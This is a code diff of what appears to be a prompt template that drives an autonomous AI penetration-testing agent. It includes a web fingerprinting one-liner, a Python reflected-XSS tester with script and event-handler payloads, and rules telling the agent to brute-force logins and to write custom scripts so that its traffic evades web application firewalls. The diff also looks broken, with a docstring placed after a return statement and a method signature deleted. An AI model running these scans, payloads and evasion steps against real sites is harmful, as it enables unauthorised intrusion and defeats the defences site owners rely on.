---- TECHNOLOGY FINGERPRINTING ---
-bash -c 'echo "=== Deep Fingerprint ==="; H=$(curl -skI https://{target}/); echo "SERVER: $(echo "$H" | grep -i ^server: | head -1)"; echo "POWERED: $(echo "$H" | grep -i ^x-powered | head -1)"; BODY=$(curl -sk https://{target}/ | head -100); echo "$BODY" | grep -oiE "(wp-content|wordpress|joomla|drupal|laravel|django|express|rails|angular|react|vue|next|nuxt|jquery-[0-9.]+|bootstrap-[0-9.]+)" | sort -u | while read t; do echo "TECH: $t"; done; echo "GENERATOR: $(echo "$BODY" | grep -oP "content=\\"\\K[^\\"]+" | head -3)"
+PYTHON SCRIPT EXAMPLE - XSS Tester:
+{{"reasoning":"Test for XSS in form parameters","action":"SCRIPT","script_type":"python","script":"import urllib.request, urllib.parse, ssl, re\\nctx = ssl._create_unverified_context()\\ntarget = '{target}'\\nprint('=== XSS Tester ===')\\n# Get form params\\ntry:\\n    body = urllib.request.urlopen(f'https://{{target}}/', context=ctx, timeout=10).read().decode(errors='ignore')\\n    params = list(set(re.findall(r'name=\\"([^\\"]+)\\"', body)))\\nexcept: params = ['q', 'search', 'id', 'page']\\npayloads = ['<script>alert(1)</script>', '\\\"onmouseover=\\\"alert(1)\\\"', '><img src=x onerror=alert(1)>', '<svg onload=alert(1)>']\\nfor param in params[:10]:\\n    for pay in payloads:\\n        try:\\n            encoded = urllib.parse.quote(pay)\\n            r = urllib.request.urlopen(f'https://{{target}}/?{{param}}={{encoded}}', context=ctx, timeout=10)\\n            resp = r.read(5000).decode(errors='ignore')\\n            if pay in resp or 'alert(1)' in resp:\\n                print(f'POSSIBLE XSS: param={{param}} payload={{pay}}')\\n        except: pass","phase":"{phase}","expected_outcome":"Discover reflected XSS vulnerabilities"}}
+
+FORMAT 3 - Done:
+{{"reasoning":"summary of all findings","action":"GOAL_ACHIEVED","findings_summary":"all vulns found","phase":"REPORT"}}
 
 === SCRIPTING RULES ===
-1. ALTERNATE commands: tool → script → tool → script (NEVER 2 basic tools in a row)
-2. After nmap/nikto/sqlmap/ffuf/etc, MUST write bash -c '...' or python3 -c '...' script next
-3. After a script, you CAN use a basic tool again
-4. Write bash -c '...' for multi-step operations
-5. Use python3 -c '...' for complex logic (urllib, json parsing, encoding)
-6. Chain operations: extract → analyze → test in ONE command
+1. ALTERNATE: tool -> SCRIPT -> tool -> SCRIPT (NEVER 2 basic tools in a row)
+2. Use SCRIPT action for ANY multi-step operation (loops, curl %{{http_code}}, regex, chaining)
+3. Use COMMAND for simple single-tool runs (nmap, nikto, sqlmap, nuclei, ffuf, etc.)
+4. SCRIPT code is written to a file and executed - NO bash -c quoting issues!
+5. In bash SCRIPT: use #!/bin/bash header, set target variable, use $target
+6. In python SCRIPT: import what you need, target = '{target}'
 7. Custom scripts bypass WAF because they don't have tool signatures
-8. ALWAYS add --max-time to curl inside scripts (prevents hanging)
-9. Use /tmp/z* for temp files (zcookie, zbody, zheaders, zurls)
-10. For login brute: ALWAYS get fresh CSRF token before EACH attempt
-11. Test MULTIPLE payloads per parameter, not just one
-12. Extract info from responses (headers, body, status codes, sizes)
-
-=== RESPOND WITH JSON ONLY ===
-{{"reasoning":"brief analysis","action":"COMMAND","command":"linux command (NO proxychains!)","phase":"{phase}","expected_outcome":"what we expect"}}
-
-OR if done:
-{{"reasoning":"summary","action":"GOAL_ACHIEVED","findings_summary":"all findings","phase":"REPORT"}}
+8. ALWAYS add --max-time to curl inside scripts
+9. Use /tmp/z* for temp files (zcookie, zbody, zheaders)
+10. Chain operations: extract -> analyze -> test in ONE script
 """
-
-    def think(self, target, goal, knowledge_base, last_command="", last_output="", phase="recon"):
+        return prompt
         """
         AI thinks and decides the next action to take.
         
